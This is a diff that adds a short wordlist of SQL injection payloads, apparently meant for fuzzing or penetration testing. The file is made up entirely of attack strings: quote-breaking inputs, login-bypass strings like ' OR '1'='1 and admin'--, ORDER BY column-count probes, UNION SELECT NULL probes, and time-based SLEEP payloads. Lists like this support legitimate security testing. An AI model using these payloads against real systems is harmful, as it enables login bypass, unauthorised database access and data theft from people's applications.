@@ -1,0 +1,22 @@
+'
+''
+`
+')
+")
+')--
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+admin'--
+admin' #
+' OR 'x'='x
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--
+1; SELECT SLEEP(5)--
